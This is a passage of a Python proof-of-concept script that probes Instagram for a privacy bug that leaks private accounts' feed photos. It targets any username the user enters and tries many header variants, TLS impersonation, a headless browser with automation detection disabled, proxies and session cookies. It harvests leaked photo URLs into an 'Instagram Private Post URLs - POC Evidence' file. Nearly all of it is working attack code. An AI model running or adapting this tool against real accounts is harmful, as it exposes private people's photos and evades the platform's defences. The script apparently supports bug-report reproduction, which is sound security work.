                r = cffi.get(url, headers=h, cookies=cookies,
                              impersonate=impersonate, proxies=proxies,
                              timeout=30, allow_redirects=False)
            except Exception as e:
                continue
            sig = {
                'status': r.status_code,
                'bytes': len(r.content),
                'x-fb-debug': r.headers.get('x-fb-debug', '')[:24],
                'content-encoding': r.headers.get('content-encoding', '-'),
                'csp-nonce': '-',
                'x-ig-app-id': '-',
            }
            scan = scan_markers(r.text)
            plabel = f'tls_imp_{impersonate}__{target_label}'
            if cookies: plabel += '__auth'
            if save:
                save_artifact(target_username, plabel, r.text,
                                'html' if 'html' in target_label else 'json')
            p = {
                'kind': f'tls_imp_{target_label}',
                'url': url, 'label': plabel, 'sig': sig,
                'scan': scan, 'response': r,
            }
            probes.append(p)
            print(f"  [{auth_label} {plabel:<54}] "
                  f"HTTP {sig['status']:<3} {sig['bytes']:>5}B  "
                  f"{fmt_scan(scan) or 'no markers'}")
            if scan['real_hit'] and not first_hit:
                first_hit = p
            time.sleep(0.4)

    return probes, first_hit


                                                             
                                                                       
                                                                    
                                                                          
                                                 

def probe_real_browser(target_username, cookies, save, proxies):
    """Phase 16: Playwright-driven real browser. Loads /<username>/ as a
    real authenticated browser would, captures the SSR HTML and any API
    responses fired during the React render."""
    if not HAVE_PLAYWRIGHT:
        return [_empty_probe('real_browser', 'n/a',
                              'playwright_unavailable',
                              'playwright not installed')], None

    from playwright.sync_api import sync_playwright

    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'
    captured_responses = []

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True,
                                          args=['--disable-blink-features=AutomationControlled'])
            context = browser.new_context(
                user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                             'AppleWebKit/537.36 (KHTML, like Gecko) '
                             'Chrome/141.0.0.0 Safari/537.36'),
                viewport={'width': 1280, 'height': 800},
                locale='en-US',
            )
            if cookies:
                context.add_cookies([
                    {'name': k, 'value': v, 'domain': '.instagram.com', 'path': '/'}
                    for k, v in cookies.items()
                ])
            page = context.new_page()

            def on_response(resp):
                u = resp.url
                if ('/api/v1/' in u or '/graphql/query' in u) \
                        and resp.status == 200:
                    try:
                        body = resp.text()
                        if len(body) > 200:
                            captured_responses.append({
                                'url': u, 'status': resp.status, 'body': body
                            })
                    except Exception:
                        pass

            page.on('response', on_response)
            page.goto(f'https://www.instagram.com/{target_username}/',
                       wait_until='networkidle', timeout=60000)
            html = page.content()
            browser.close()
    except Exception as e:
        return [_empty_probe('real_browser',
                               f'https://www.instagram.com/{target_username}/',
                               'real_browser_error',
                               type(e).__name__)], None

               
    sig = {'status': 200, 'bytes': len(html), 'x-fb-debug': '',
           'content-encoding': '-', 'csp-nonce': '-', 'x-ig-app-id': '-'}
    scan = scan_markers(html)
    plabel = 'real_browser__main_html' + ('__auth' if cookies else '')
    if save:
        save_artifact(target_username, plabel, html, 'html')
    main_probe = {
        'kind': 'real_browser_html', 'url': f'https://www.instagram.com/{target_username}/',
        'label': plabel, 'sig': sig, 'scan': scan, 'response': None, 'rendered_html': html,
    }
    probes.append(main_probe)
    print(f"  [{auth_label} {plabel:<54}] "
          f"HTTP 200 {sig['bytes']:>5}B (rendered)  {fmt_scan(scan) or 'no markers'}")
    if scan['real_hit']:
        first_hit = main_probe

                                                       
    print(f"  [+] Captured {len(captured_responses)} background API responses:")
    for cap in captured_responses[:15]:
        api_scan = scan_markers(cap['body'])
        feed_urls = api_scan.get('photo_urls', 0)
        leak_pl = len(api_scan.get('leaking_preloaders') or [])
        url_short = cap['url'][:90]
        flag = '  ***' if (feed_urls or leak_pl or api_scan['real_hit']) else ''
        print(f"      {cap['status']} {len(cap['body']):>6}B  feedURLs={feed_urls} "
              f"leak_pl={leak_pl}  {url_short}{flag}")
        plabel2 = f'real_browser__api_{abs(hash(cap["url"])) % 100000}'
        if save:
            save_artifact(target_username, plabel2, cap['body'], 'json')
        ap = {
            'kind': 'real_browser_api', 'url': cap['url'], 'label': plabel2,
            'sig': {'status': cap['status'], 'bytes': len(cap['body']),
                     'x-fb-debug': '', 'content-encoding': '-',
                     'csp-nonce': '-', 'x-ig-app-id': '-'},
            'scan': api_scan, 'response': None, 'captured_body': cap['body'],
        }
        probes.append(ap)
        if api_scan['real_hit'] and not first_hit:
            first_hit = ap

    return probes, first_hit


def run_trigger_state_probes(target_username, cookies, save, proxies, stop_on_first):
    """Phase 12: hunt for the corrupted-state bug from the original report.
    For each header combo, extract follower/following/post counts and compare
    to baseline. Flag any (counts_zero AND edges_filled) as the leak signature."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'

                                                               
    baseline_v = next(x for x in HEADER_VARIANTS if x.get('mobile'))
    baseline_h = build_headers(baseline_v)
    if cookies:
        baseline_h['x-csrftoken'] = cookies['csrftoken']
    try:
        r0 = requests.get(f'https://www.instagram.com/{target_username}/',
                           headers=baseline_h, cookies=cookies, proxies=proxies,
                           timeout=30, allow_redirects=False)
    except requests.exceptions.RequestException:
        r0 = None
    baseline_counts = extract_profile_counts(r0.text) if r0 else None
    if baseline_counts:
        print(f"  [baseline] followers={baseline_counts[0]} "
              f"following={baseline_counts[1]} posts={baseline_counts[2]} "
              f"(via {baseline_counts[3]})")
    else:
        print(f"  [baseline] no counts extracted (response may be 302/login)")
    time.sleep(0.6)

    for label, override_hdrs in TRIGGER_PROBE_COMBOS:
                                                         
        h = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                       '*/*;q=0.8',
            'accept-language': 'en-GB,en;q=0.9',
            'accept-encoding': ACCEPT_ENCODING,
            'priority': 'u=0, i',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'upgrade-insecure-requests': '1',
        }
        no_chua = override_hdrs.pop('no_chua', False)
        no_dpr = override_hdrs.pop('no_dpr', False)
        if not no_dpr:
            h['dpr'] = override_hdrs.pop('dpr', '1')
        if not no_chua:
            h.update({
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"6.0"',
                'sec-ch-prefers-color-scheme': 'dark',
            })
        h.update(override_hdrs)
        if cookies:
            h['x-csrftoken'] = cookies['csrftoken']

        try:
            r = requests.get(f'https://www.instagram.com/{target_username}/',
                              headers=h, cookies=cookies, proxies=proxies,
                              timeout=30, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            p = _empty_probe(f'trigger_{label}',
                              f'https://www.instagram.com/{target_username}/',
                              f"trigger__{label}", type(e).__name__)
            probes.append(p)
            continue

        sig = response_signature(r)
        scan = scan_markers(r.text)
        counts = extract_profile_counts(r.text)
        trigger = detect_trigger_state(scan, counts, baseline_counts)
        plabel = f"trigger__{label}" + ('__auth' if cookies else '')
        if save:
            save_artifact(target_username, plabel, r.text, 'html')

        cnt_str = (f"f={counts[0]}/fol={counts[1]}/p={counts[2]}"
                    if counts else "f=?/fol=?/p=?")
        feed_urls = scan.get('photo_urls', 0)
        leak_pl = len(scan.get('leaking_preloaders') or [])
        gated_pl = len(scan.get('gated_preloaders') or [])
        trig_str = ''
        if trigger:
            kind, detail = trigger
            trig_str = f'  *** {kind}: {detail} ***'

        print(f"  [{auth_label} {plabel:<48}] "
              f"HTTP {sig['status']} {sig['bytes']:>6}B  {cnt_str:<22} "
              f"feedURLs={feed_urls} leak_pl={leak_pl} gated_pl={gated_pl}{trig_str}")

        p = {
            'kind': f'trigger_{label}',
            'url': f'https://www.instagram.com/{target_username}/',
            'label': plabel, 'sig': sig, 'scan': scan,
            'counts': counts, 'baseline': baseline_counts,
            'trigger_state': trigger, 'response': r,
        }
        probes.append(p)
        if trigger and trigger[0] == 'TRIGGER_STATE_LEAK' and not first_hit:
            first_hit = p
            if stop_on_first:
                return probes, first_hit
        time.sleep(0.4)

    return probes, first_hit


def run_navchain_sweep(target_username, cookies, save, proxies, stop_on_first):
    """Phase 10: hits /<u>/ once per NAV_CHAINS entry, fingerprinting whether
    the response varies by navigation context. The current finding (April
    2026) is that IG ignores nav-chain for auth gating, but if Meta starts
    A/B-testing different render paths conditioned on chain reason, this
    catches it. Mobile variant only — minimal matrix overhead."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'
    v = next(x for x in HEADER_VARIANTS if x.get('mobile'))

    for chain_label, chain_value in NAV_CHAINS.items():
        h = build_headers(v, nav_chain=chain_value)
        if cookies:
            h['x-csrftoken'] = cookies['csrftoken']
        url = f'https://www.instagram.com/{target_username}/'
        try:
            r = requests.get(url, headers=h, cookies=cookies, proxies=proxies,
                              timeout=30, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            p = _empty_probe(f'navchain_{chain_label}', url,
                              f"{v['name']}__navchain_{chain_label}",
                              type(e).__name__)
            probes.append(p)
            continue
        sig = response_signature(r)
        scan = scan_markers(r.text)
        label = f"{v['name']}__navchain_{chain_label}"
        if cookies:
            label += '__auth'
        if save:
            save_artifact(target_username, label, r.text, 'html')
        p = {
            'kind': f'navchain_{chain_label}',
            'url': url, 'label': label, 'sig': sig,
            'scan': scan, 'response': r,
            'nav_chain': chain_value,
        }
        probes.append(p)
        leak_count = len(scan.get('leaking_preloaders', []))
        print(f"  [{auth_label} {p['label']:<58}] "
              f"HTTP {sig['status']} {sig['bytes']:>6}B  "
              f"leak_preloaders={leak_count} {fmt_scan(scan)}")
        if scan['real_hit'] and not first_hit:
            first_hit = p
            if stop_on_first:
                return probes, first_hit
        time.sleep(0.4)

                                                                            
                                                                           
                                                                            
    if len(probes) >= 2:
        clusters = defaultdict(list)
        for p in probes:
            if p.get('response') is None:
                continue
            s = p['scan']; sig = p['sig']
            key = (
                sig['bytes'] // 4096,
                s['full_markers'], s['partial_markers'],
                s['photo_urls'] > 0, s['empty_timeline'],
                s['login_wall'], s['is_private_true'],
                len(s.get('leaking_preloaders') or []),
                len(s.get('gated_preloaders') or []),
            )
            clusters[key].append(p['nav_chain'] or 'none')
        if len(clusters) <= 1:
            print(f"  [+] nav-chain has NO observable effect "
                  f"({len(probes)} variants -> 1 structural cluster)")
        else:
            print(f"  [!] nav-chain produced {len(clusters)} distinct render paths:")
            for sig_key, chains in sorted(clusters.items(), key=lambda kv: -len(kv[1])):
                print(f"      cluster size_kb={sig_key[0]*4} markers={sig_key[1]}/{sig_key[2]} "
                      f"feedURLs>0={sig_key[3]} leak_preloaders={sig_key[7]} "
                      f"-> n={len(chains)}: {chains}")

    return probes, first_hit


def run_alt_probes(target_username, cookies, save, proxies):
    """Phase 7: genuinely different surfaces — mobile host, oEmbed, Wayback,
    Google cache. Each is one shot; not in the variant×endpoint matrix."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'
    v = HEADER_VARIANTS[0]

    def record(p):
        nonlocal first_hit
        if p is None:
            return
        if isinstance(p, list):
            for x in p: record(x)
            return
        probes.append(p)
        print(f"  [{auth_label} {p['label']:<60}] "
              f"HTTP {p['sig']['status']} {p['sig']['bytes']:>5} B | "
              f"{fmt_scan(p['scan'])}")
        if p['scan']['real_hit'] and not first_hit:
            first_hit = p

    print("  [alt] mobile host (i.instagram.com)...")
    record(probe_mobile_host(target_username, v, cookies, save, proxies))
    time.sleep(0.4)

    print("  [alt] oembed API (api.instagram.com)...")
    record(probe_oembed(target_username, v, save, proxies))
    time.sleep(0.4)

    print("  [alt] Wayback Machine indexed snapshots (web.archive.org)...")
    record(probe_wayback(target_username, save, proxies))
    time.sleep(0.4)

    print("  [alt] archive.org Save Page Now (US-egress crawler)...")
    record(probe_archive_org_save(target_username, save, proxies))
    time.sleep(0.4)

    print("  [alt] Bing cache (Google's was deprecated Jan 2024)...")
    record(probe_bing_cache(target_username, v, save, proxies))

    return probes, first_hit


def probe_api_by_uid(uid, variant, ep_label, ep_path, cookies=None, save=False,
                      host='www.instagram.com', proxies=None):
    url = f"https://{host}{ep_path.format(uid=uid)}"
    headers = build_headers(variant)
    headers.update({
        'x-ig-app-id': IG_WEB_APP_ID,
        'x-asbd-id': '129477',
        'x-requested-with': 'XMLHttpRequest',
        'accept': '*/*',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'referer': 'https://www.instagram.com/',
    })
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=30)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__uid_{ep_label}" + ('__auth' if cookies else '')
    if save:
        save_artifact(uid, label, r.text, 'json')
    return {
        'kind': f'uid_{ep_label}',
        'url': url,
        'label': label,
        'sig': sig,
        'scan': scan,
        'response': r,
    }


def probe_api_feed_user(username, variant, cookies=None, save=False, proxies=None):
    url = f"https://www.instagram.com/api/v1/feed/user/{username}/username/?count=12"
    headers = build_headers(variant)
    headers.update({
        'x-ig-app-id': IG_WEB_APP_ID,
        'x-asbd-id': '129477',
        'x-requested-with': 'XMLHttpRequest',
        'accept': '*/*',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'referer': f"https://www.instagram.com/{username}/",
    })
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=30)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__api_feed_user" + ('__auth' if cookies else '')
    if save:
        save_artifact(username, label, r.text, 'json')
    return {
        'kind': 'api_feed_user',
        'url': url,
        'label': label,
        'sig': sig,
        'scan': scan,
        'response': r,
    }


def extract_timeline_data(html_content):
    """
    Extracts timeline data from Instagram profile HTML.
    (Original v1 signature, kept for compatibility with test_with_cookies.py.)
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    script_tags = soup.find_all('script', {'type': 'application/json'})
    print(f"[*] Found {len(script_tags)} JSON script tags")

    for script in script_tags:
        script_content = script.string
        if not script_content:
            continue
        if not (any(m in script_content for m in TIMELINE_MARKERS)
                and 'image_versions2' in script_content):
            continue
        print("[+] Found script with timeline markers + image_versions2")
        try:
            return json.loads(script_content)
        except json.JSONDecodeError as e:
            print(f"[-] JSON parsing error: {e}")
            continue

    print("[-] Timeline data not found in any script tag")
    return None


def decode_url(escaped_url):
    decoded = escaped_url.replace('\\/', '/')
    try:
        decoded = decoded.encode('utf-8').decode('unicode_escape')
    except Exception:
        pass
    return unquote(decoded)


def extract_all_image_urls_recursive(obj, urls=None, post_id=None):
    """
    Recursively extracts all image URLs from any nested JSON-shaped object.
    Returns a set of (post_id, resolution, decoded_url) tuples.
    """
    if urls is None:
        urls = set()

    if isinstance(obj, dict):
        if 'pk' in obj and isinstance(obj.get('pk'), str):
            post_id = obj['pk']
        if 'image_versions2' in obj:
            for candidate in obj['image_versions2'].get('candidates', []):
                url = candidate.get('url', '')
                if not url:
                    continue
                resolution = f"{candidate.get('width', 0)}x{candidate.get('height', 0)}"
                urls.add((post_id or 'unknown', resolution, decode_url(url)))
        for value in obj.values():
            extract_all_image_urls_recursive(value, urls, post_id)
    elif isinstance(obj, list):
        for item in obj:
            extract_all_image_urls_recursive(item, urls, post_id)
    return urls


def extract_urls_from_text(text):
    """
    Regex fallback for partial leaks: only photo CDN paths
    (scontent*.cdninstagram.com/v/t51.* — used for feed photos/videos),
    NOT static asset CDN (static.cdninstagram.com/rsrc.php/...).
    """
    found = set()
    for m in PHOTO_CDN_PATTERN.finditer(text):
        found.add(('regex', 'unknown', decode_url(m.group(0))))
    return found


def save_urls_to_file(image_urls, filename='extracted_urls.txt'):
    urls_by_post = {}
    for post_id, resolution, url in image_urls:
        urls_by_post.setdefault(post_id, []).append((resolution, url))

    with open(filename, 'w', encoding='utf-8') as f:
        f.write("Instagram Private Post URLs - POC Evidence\n")
        f.write("=" * 80 + "\n\n")
        f.write(f"Total Posts: {len(urls_by_post)}\n")
        f.write(f"Total Image URLs: {len(image_urls)}\n\n")
        f.write("=" * 80 + "\n\n")

        for post_id, resolutions in urls_by_post.items():
            f.write(f"POST ID: {post_id}\n")
            f.write(f"Number of images: {len(resolutions)}\n")
            f.write("-" * 80 + "\n")
            for i, (resolution, url) in enumerate(resolutions, 1):
                f.write(f"\n  Image {i}:\n")
                f.write(f"  Resolution: {resolution}\n")
                f.write(f"  URL: {url}\n")
            f.write("\n" + "=" * 80 + "\n\n")

    print(f"[+] Saved {len(image_urls)} URLs from {len(urls_by_post)} posts to {filename}")


def run_probes(username, cookies, html_only, api_only, stop_on_first, save, proxies=None):
    """
    Returns (probes, first_full_hit, user_id). Each probe dict has keys:
      kind, url, label, sig, scan, response.
    user_id is harvested opportunistically from web_profile_info responses
    so the caller can run the uid-based phase.
    """
    probes = []
    first_hit = None
    user_id = None
    auth_label = '[auth]' if cookies else '[unauth]'

    def record(p):
        nonlocal first_hit
        probes.append(p)
        print(f"  [{auth_label} {p['label']:<60}] "
              f"{fmt_signature(p['sig'])} | {fmt_scan(p['scan'])}")
        if p['scan']['real_hit'] and not first_hit:
            first_hit = p
            return stop_on_first
        return False

    for variant in HEADER_VARIANTS:
        if not api_only:
            for suffix_label, suffix in HTML_ENDPOINT_SUFFIXES:
                p = probe_html(username, variant, suffix_label, suffix, cookies, save, proxies)
                if not user_id:
                    user_id = extract_user_id_from_response(p['response'].text)
                if record(p):
                    return probes, first_hit, user_id
                time.sleep(0.4)

        if not html_only:
            p = probe_api_web_profile_info(username, variant, cookies, save, proxies)
            if not user_id:
                user_id = extract_user_id_from_response(p['response'].text)
            if record(p):
                return probes, first_hit, user_id
            time.sleep(0.4)

            p = probe_api_feed_user(username, variant, cookies, save, proxies)
            if record(p):
                return probes, first_hit, user_id
            time.sleep(0.4)

    return probes, first_hit, user_id


def run_uid_probes(user_id, cookies, stop_on_first, save, proxies=None):
    """Hits the user_id-based mobile-API endpoints with a small variant subset.
    Web profile gating sometimes doesn't apply to these — they were referenced
    from the polaris HTML preloader config, suggesting they're served by the
    same backend that the buggy web profile route also calls."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'

                                                                           
    selected = [v for v in HEADER_VARIANTS if v.get('mobile')][:3]

    for variant in selected:
        for ep_label, ep_path in USER_ID_ENDPOINTS:
            p = probe_api_by_uid(user_id, variant, ep_label, ep_path,
                                  cookies, save, proxies=proxies)
            probes.append(p)
            print(f"  [{auth_label} {p['label']:<60}] "
                  f"{fmt_signature(p['sig'])} | {fmt_scan(p['scan'])}")
            if p['scan']['real_hit'] and not first_hit:
                first_hit = p
                if stop_on_first:
                    return probes, first_hit
            time.sleep(0.4)

    return probes, first_hit


def parse_json_safely(text):
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return None


def harvest_urls_from_probe(probe):
    text = probe['response'].text
    kind = probe['kind']

    if kind == 'html':
        data = extract_timeline_data(text)
        if data:
            urls = extract_all_image_urls_recursive(data)
            if urls:
                return urls
    else:
        data = parse_json_safely(text)
        if data:
            urls = extract_all_image_urls_recursive(data)
            if urls:
                return urls

    if probe['scan']['photo_urls']:
        return extract_urls_from_text(text)
    return set()


def structural_signature(p):
    """Stable signature ignoring per-request noise (CSP nonces, x-fb-debug,
    preloader IDs, request IDs). Two responses with the same signature have
    the same structural shape and the same set of privacy-relevant markers."""
    s = p['scan']
    sig = p['sig']
                                                                   
    size_kb = sig['bytes'] // 4096
    return (
        p['kind'],
        size_kb,
        s['full_markers'],
        s['partial_markers'],
        s['photo_urls'] > 0,
        min(s['avatar_urls'], 10),
        s['empty_timeline'],
        s['login_wall'],
        s['is_private_true'],
        s['is_private_false'],
    )


def is_anomaly(p):
    """Privacy-relevant anomalies (non-jitter):
        (a) Polaris feed preloader shipped with complete=true + non-empty edges
            + image_versions2 — the canonical leak signature, OR
        (b) feed media URL leaked, OR
        (c) image_versions2 / display_uri / XIGPolarisImageMedia partial marker, OR
        (d) HTML profile response with two structural markers AND neither
            empty-edges nor login-wall (the gate is missing on the page that
            should be gated). Restricted to HTML — API responses don't have
            those gates by design and would false-positive otherwise."""
    s = p['scan']
    if s.get('leaking_preloaders'):
        names = ','.join(p2['key'] for p2 in s['leaking_preloaders'][:2])
        return ('polaris_preloader_complete', f"preloader={names}")
    if s['real_hit']:
        return ('feed_media_leak', f"feedURLs={s['photo_urls']}")
    if s['photo_urls'] > 0:
        return ('feed_url_in_body', f"feedURLs={s['photo_urls']}")
    if s['partial_markers'] > 0:
        return ('partial_marker', f"partial={s['partial_markers']}")
    if (p['kind'] == 'html'
            and s['full_markers'] >= 2
            and not s['empty_timeline']
            and not s['login_wall']):
        return ('html_structural_no_gate',
                f"full={s['full_markers']} (no edges:[] / no wall)")
    return None


def print_anomaly_report(probes, username, save):
    if not probes:
        return []

    clusters = defaultdict(list)
    for p in probes:
        clusters[structural_signature(p)].append(p)

    print(f"  Response clusters by structural signature: {len(clusters)} "
          f"(across {len(probes)} probes)")
    for sig, members in sorted(clusters.items(), key=lambda kv: -len(kv[1])):
        sample = members[0]
        size = sample['sig']['bytes']
        scan_summary = fmt_scan(sample['scan']) or 'no markers'
        print(f"    n={len(members):<3} ~{size:>7} B  [{sample['kind']}]  "
              f"{scan_summary}")
        if len(members) <= 2:
            for m in members:
                print(f"        - {m['label']}")

    anomalies = [(p, is_anomaly(p)) for p in probes]
    anomalies = [(p, reason) for p, reason in anomalies if reason]
    if not anomalies:
        print()
        print("  No privacy-relevant anomalies detected.")
        return []

    print()
    print(f"  [!] {len(anomalies)} privacy-relevant anomalies flagged:")
    for p, (kind, detail) in anomalies:
        print(f"      - [{kind}] {p['label']}  {detail}")
        print(f"        {p['url']}")
        print(f"        {fmt_scan(p['scan'])}")
                                                                           
                                                                          
        ext = 'html' if p['kind'] == 'html' else 'json'
        saved = save_artifact(username, f"anomaly__{p['label']}",
                              p['response'].text, ext)
        save_artifact(username, f"anomaly__{p['label']}__headers",
                      json.dumps(safe_response_headers(
                          p['response'].headers), indent=2), 'json')
        rel = os.path.relpath(saved, os.path.dirname(os.path.abspath(__file__)))
        print(f"        saved -> {rel}")
    print()
    return [p for p, _ in anomalies]


def warm_session(variant):
    """Mimics a real browser landing on instagram.com first, picking up
    csrftoken/mid/datr cookies, then navigating to the target. The leak in
    the original report was reproduced from a warm Incognito session, not
    a cold curl-style request."""
    s = requests.Session()
    headers = build_headers(variant)
    try:
        s.get('https://www.instagram.com/', headers=headers, timeout=20)
    except requests.RequestException:
        return None
    return s


def print_preloader_breakdown(probes):
    """Reports how the canonical Polaris feed preloaders behaved across the
    matrix. The screenshot methodology: find PolarisProfilePostsLoggedOutTabContentQuery
    (or equivalent) and look at its __bbox state."""
    by_query = {}
    for p in probes:
        for pl in p['scan'].get('preloaders', []):
            key = pl['query_class']
            by_query.setdefault(key, {'leak': 0, 'gated': 0, 'probes': []})
            if pl['complete'] and pl['edges_count'] > 0 and pl['has_image_versions2']:
                by_query[key]['leak'] += 1
                by_query[key]['probes'].append(p['label'])
            else:
                by_query[key]['gated'] += 1
    if not by_query:
        print("  no Polaris feed preloaders found in any response")
        return
    print(f"  Polaris feed preloader observations:")
    for query_class, stats in sorted(by_query.items()):
        total = stats['leak'] + stats['gated']
        marker = '  <-- LEAK' if stats['leak'] else ''
        print(f"    {query_class:<55} total={total:<3} "
              f"complete+edges={stats['leak']:<3} gated/empty={stats['gated']}{marker}")
        if stats['leak']:
            for lbl in stats['probes'][:5]:
                print(f"      leaking probe: {lbl}")


def print_summary(probes, username):
    print()
    print("=" * 80)
    print(f"POLARIS PRELOADER BREAKDOWN  ({username})")
    print("=" * 80)
    print_preloader_breakdown(probes)
    print()
    print("=" * 80)
    print(f"PROBE MATRIX  ({len(probes)} requests, target: {username})")
    print("=" * 80)
    real_hits = [p for p in probes if p['scan']['real_hit']]
    structural_only = [p for p in probes
                       if not p['scan']['real_hit']
                       and p['scan']['full_markers']
                       and p['scan']['empty_timeline']]
    partial_hits = [p for p in probes
                    if not p['scan']['real_hit']
                    and p['scan']['partial_markers']]
    avatar_only = [p for p in probes
                   if not p['scan']['real_hit']
                   and p['scan']['avatar_urls'] > 0
                   and p['scan']['photo_urls'] == 0]
    walls = [p for p in probes if p['scan']['login_wall']]
    print(f"  REAL HITS (feed media leaked):           {len(real_hits)}")
    print(f"  empty timeline (IG-correct for private): {len(structural_only)}")
    print(f"  partial-marker (no feed URLs):           {len(partial_hits)}")
    print(f"  avatar-only (og:image, expected):        {len(avatar_only)}")
    print(f"  login-wall responses:                    {len(walls)}")
    print()
    if real_hits:
        print("REAL HITS:")
        for p in real_hits:
            print(f"  - {p['label']:<60} feedURLs={p['scan']['photo_urls']}  {p['url']}")
    if partial_hits:
        print("PARTIAL HITS (worth manual review):")
        for p in partial_hits:
            print(f"  - {p['label']:<60} {p['url']}")
    print()


def main():
    print("=" * 80)
    print("=" * 80)
    print()

    raw = sys.argv[1:]
    flags = set()
    args = []
    proxy_url = None
    i = 0
    while i < len(raw):
        a = raw[i]
        if a == '--proxy' and i + 1 < len(raw):
            proxy_url = raw[i + 1]
            i += 2
            continue
        if a.startswith('--proxy='):
            proxy_url = a.split('=', 1)[1]
            i += 1
            continue
        if a.startswith('--'):
            flags.add(a)
        else:
            args.append(a)
        i += 1
    username = args[0].strip() if args else input("Enter Instagram username to test: ").strip()
    if not re.fullmatch(r'[A-Za-z0-9._]{1,30}', username):
        print("[-] Error: username must match [A-Za-z0-9._]{1,30}")
        return

    use_auth = '--auth' in flags
    stop_on_first = '--all' not in flags
    save = '--save' in flags
    html_only = '--html-only' in flags
    api_only = '--api' in flags and not html_only
    skip_uid = '--no-uid' in flags
    skip_graphql = '--no-graphql' in flags
    warm = '--warm' in flags
    full = '--full' in flags                                                    
    reverse = '--reverse' in flags                                                 
    dm = '--dm' in flags                                       
    activity = '--activity' in flags                                
    signal = '--signal' in flags                                            
    deep = '--deep' in flags                                                  
    bloks = '--bloks' in flags                                             
    gql = '--gql' in flags                                                 

                                                                           
                                                                       
                                                                        
    if full:
        HEADER_VARIANTS.extend(FULL_HEADER_VARIANTS_EXTRA)
        HTML_ENDPOINT_SUFFIXES.extend(FULL_HTML_ENDPOINT_SUFFIXES_EXTRA)

    proxies = None
    if proxy_url:
        proxies = {'http': proxy_url, 'https': proxy_url}

    print(f"[*] Target: {username}")
    print(f"[*] Mode:   {'FULL (all phases)' if full else 'LEAN (earners only — pass --full for everything)'}  "
          f"stop_on_first={stop_on_first}  save={save}  "
          f"reverse={'on' if reverse else 'off'}  "
          f"dm={'on' if dm else 'off'}  "
          f"activity={'on' if activity else 'off'}  "
          f"signal={'on' if signal else 'off'}  "
          f"deep={'on' if deep else 'off'}  "
          f"bloks={'on' if bloks else 'off'}  "
          f"gql={'on' if gql else 'off'}")
    print(f"[*] Variants: {len(HEADER_VARIANTS)}  HTML suffixes: {len(HTML_ENDPOINT_SUFFIXES)}  "
          f"uid-API: {len(USER_ID_ENDPOINTS) if (not skip_uid and full) else 0}  "
          f"GraphQL: {len(GRAPHQL_QUERY_NAMES) if (not skip_graphql and full) else 0}")
    print(f"[*] Egress:   proxy={proxy_url or 'none (local)'}  "
          f"accept-encoding={ACCEPT_ENCODING}")
    if not HAVE_BROTLI:
        print("[!] brotli decoder NOT installed: cannot advertise br. "
              "Install with `pip install brotli` to match original leak conditions.")
    print()

    cookies = None
    if use_auth:
        cookies = load_env_cookies()
        if cookies:
            print("[*] Loaded authenticated session cookies")
        else:
            print("[-] --auth requested but ../.env missing required keys; falling back to unauth only")

    if warm:
        print("[*] Warming session against instagram.com root...")
        ws = warm_session(HEADER_VARIANTS[0])
        if ws and not cookies:
            warmed = {k: v for k, v in ws.cookies.get_dict().items()
                      if k in {'csrftoken', 'mid', 'ig_did', 'datr'}}
            if warmed:
                print(f"    picked up cookies: {list(warmed.keys())}")
                cookies = {**warmed, **(cookies or {})}
                cookies.setdefault('ds_user_id', '')
                cookies.setdefault('sessionid', '')

                                                                        
                                                                            
                                                                          
                                     
    probes_unauth, probes_auth = [], []
    hit = None
    uid_unauth = uid_auth = None

    if full:
        print()
        print("[*] Phase 1: UNAUTHENTICATED probe matrix (username-keyed)")
        probes_unauth, hit, uid_unauth = run_probes(
            username, None, html_only, api_only, stop_on_first, save, proxies)
        if cookies and (not hit or not stop_on_first):
            print()
            print("[*] Phase 2: AUTHENTICATED probe matrix")
            probes_auth, hit_auth, uid_auth = run_probes(
                username, cookies, html_only, api_only, stop_on_first, save, proxies)
            if not hit and hit_auth:
                hit = hit_auth

    user_id = uid_unauth or uid_auth
    uid_probes_unauth = []
    uid_probes_auth = []
                                                                            
                                                                                   
    if full and user_id and not html_only and not skip_uid and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 3: UID-BASED probes (uid={user_id}, mobile-API endpoints)")
        uid_probes_unauth, uid_hit = run_uid_probes(user_id, None, stop_on_first, save, proxies)
        if not hit and uid_hit:
            hit = uid_hit
        if cookies and (not hit or not stop_on_first):
            print()
            print(f"[*] Phase 4: UID-BASED probes (auth, uid={user_id})")
            uid_probes_auth, uid_hit_auth = run_uid_probes(
                user_id, cookies, stop_on_first, save, proxies)
            if not hit and uid_hit_auth:
                hit = uid_hit_auth

    gql_probes_unauth = []
    gql_probes_auth = []
                                                                             
                                                                           
    if full and user_id and not skip_graphql and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 5: GRAPHQL token-replay (uid={user_id})")
        gql_probes_unauth, gql_hit = run_graphql_probes(
            username, user_id, None, stop_on_first, save, proxies)
        if not hit and gql_hit:
            hit = gql_hit
        if cookies and (not hit or not stop_on_first):
            print()
            print(f"[*] Phase 6: GRAPHQL token-replay (auth)")
